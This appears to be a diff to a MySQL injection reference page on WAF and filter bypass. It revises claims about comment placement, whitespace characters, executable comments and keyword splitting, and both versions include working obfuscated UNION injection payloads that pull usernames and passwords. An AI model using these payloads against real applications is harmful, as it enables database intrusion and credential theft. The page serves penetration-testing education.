@@ -4,7 +4,7 @@ description: Techniques for bypassing WAFs and filters in MySQL injection
 category: Advanced Techniques
 order: 20
 tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
-lastUpdated: 2025-03-15
+lastUpdated: 2025-12-15
 ---
 
 ## Fuzzing and Obfuscation
@@ -13,21 +13,21 @@ Modern web applications often employ Web Application Firewalls (WAFs) and other 
 
 ### Comment Variations
 
-MySQL supports various comment styles that can be used to break up SQL keywords:
+MySQL supports various comment styles that can be inserted between SQL tokens (keywords, identifiers, operators). Note: comments cannot split keywords (e.g., `SEL/**/ECT` is invalid) - see [Keyword Splitting Myth](#keyword-splitting-myth).
 
 ```sql
--- Standard SQL comments
+-- Comments BETWEEN tokens (valid)
 SELECT/*comment*/username,password/**/FROM/**/users
 
--- MySQL-specific hash comment
+-- MySQL-specific hash comment (comments to end of line)
 SELECT # comment
 username FROM users WHERE id = 1
 
 -- C-style comments
 SELECT /* comment */ username FROM users
 
--- Nested comments (MySQL specific)
-SELECT /*! nested comment */ username FROM users
+-- Executable comments (MySQL extension, content is executed)
+SELECT /*! username */ FROM users
 ```
 
 ### Whitespace Manipulation
@@ -46,12 +46,13 @@ These characters can substitute for spaces in MySQL queries:
 | 0x0C | 12  | Form Feed/New Page | %0C         |
 | 0x0D | 13  | Carriage Return    | %0D         |
 | 0x20 | 32  | Space              | %20         |
-| 0xA0 | 160 | Non-breaking Space | %A0         |
+
+**Note:** U+00A0 (Non-breaking Space / 0xA0) does NOT work as whitespace in MySQL's SQL lexer. Only ASCII whitespace characters (0x09–0x0D and 0x20) are valid for tokenization.
 
 **Example payload:**
 
 ```text
-'%0A%09UNION%0CSELECT%A0NULL%20%23
+'%0A%09UNION%0CSELECT%0BNULL%20%23
 ```
 
 #### Characters Allowed After AND/OR
@@ -107,8 +108,8 @@ username
 FROM
 users
 
--- Unicode whitespace characters
-SELECT%A0username%A0FROM%A0users
+-- Using vertical tab and form feed (less common but valid)
+SELECT%0Busername%0CFROM%0Busers
 
 -- Excessive whitespace
 SELECT       username       FROM       users
@@ -116,12 +117,21 @@ SELECT       username       FROM       users
 
 ### Case Variation
 
-MySQL keywords are case-insensitive:
+MySQL keywords are case-insensitive, but identifier case-sensitivity depends on the operating system:
 
 ```sql
-select USERNAME from USERS where ID=1
-SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
+-- Keywords can be any case
+select username from users where id=1
+SeLeCt username FrOm users WhErE id=1
 ```
+
+**Note on identifier case sensitivity:**
+
+- **Linux/Unix:** Table and database names are case-sensitive (filesystem-dependent)
+- **Windows/macOS:** Table names are case-insensitive by default
+- **Column names:** Always case-insensitive in MySQL
+
+This means `SELECT * FROM USERS` may fail on Linux if the table was created as `users`.
 
 ### Operator Alternatives
 
@@ -197,15 +207,20 @@ EXECUTE stmt;
 UNION attacks can be obfuscated:
 
 ```sql
--- Adding redundant conditions
-1 UNION SELECT 1,2,3 WHERE 1=1
+-- Adding redundant WHERE (version-dependent, see note below)
+1 UNION SELECT 1,2,3 FROM dual WHERE 1=1
 
 -- Using NULL values
 1 UNION SELECT NULL,NULL,(SELECT username FROM users LIMIT 1)
 
--- Nested UNIONs
+-- Nested UNIONs with derived table
 1 UNION (SELECT * FROM (SELECT 1,2,3)x)
 ```
+
+**Note on WHERE without FROM:** `SELECT ... WHERE` without a FROM clause behaves differently across versions:
+
+- MySQL 5.7: Requires FROM clause (use `FROM dual`) when using WHERE
+- MySQL 8.0+: WHERE without FROM is allowed (`SELECT 1 WHERE 1=1` works)
 
 ### Encoding Bypasses
 
@@ -272,11 +287,13 @@ Use backticks to quote identifiers:
 
 #### Version-Specific Execution
 
-Wrap keywords in version-specific comments:
+Wrap SQL in executable comments (MySQL-specific extension):
 
 ```sql
--- Only executes on MySQL 5+
-/*!information_schema.tables*/
+-- Always executed by MySQL, ignored by other DBs
+/*! SELECT */ * FROM users
+
+-- Version-conditional: only on MySQL >= 5.0.0
 /*!50000 SELECT */ * FROM users
 ```
 
@@ -308,18 +325,22 @@ SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
 SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x -- 'users' in hex
 ```
 
-#### Using MySQL Comments to Break Keywords
+#### Keyword Splitting Myth
+
+Splitting keywords with inline comments (e.g., `SEL/**/ECT`) does NOT work and never has in any MySQL version. This is a widespread misconception in security literature.
 
 ```sql
--- Break 'SELECT' keyword
-SEL/**/ECT username FROM users
+-- VALID: Comments between complete tokens
+SELECT/**/ username /**/FROM/**/ users
 
--- Break 'UNION' keyword
-UNI/**/ON SEL/**/ECT 1,2,3
+-- INVALID: Splitting keywords (syntax error)
+SEL/**/ECT username FROM users      -- ERROR 1064
 
--- Break 'INFORMATION_SCHEMA' keyword
-INF/**/ORMATION_/**/SCHEMA.tables
+-- VALID: Spaces/comments around dots in qualified names
+information_schema/**/./**/columns
 ```
+
+Likely sources of confusion: executable comments (`/*! SELECT */`) which do work, and comments between tokens (`SELECT/**/username`) which is also valid.
 
 #### HTTP Parameter Pollution
 
@@ -336,12 +357,17 @@ Some WAFs can be bypassed by splitting the payload across multiple parameters:
 If 'SELECT' is blocked:
 
 ```sql
--- Using MySQL version-specific comment
-/*!50000 SELECT */ username FROM users
+-- Using MySQL executable comment
+/*! SELECT */ username FROM users
 
--- Using character obfuscation
-CONCAT('SEL','ECT') username FROM users
+-- Using alternate whitespace to break pattern matching
+SELECT%09username%0AFROM%0Dusers
+
+-- Using parentheses instead of spaces
+(SELECT(username)FROM(users))
 ```
+
+**Note:** String concatenation (`CONCAT('SEL','ECT')`) cannot be used to construct SQL keywords. Keywords must appear literally in the query; they cannot be dynamically built from strings.
 
 #### Bypassing WAF Pattern Recognition
 
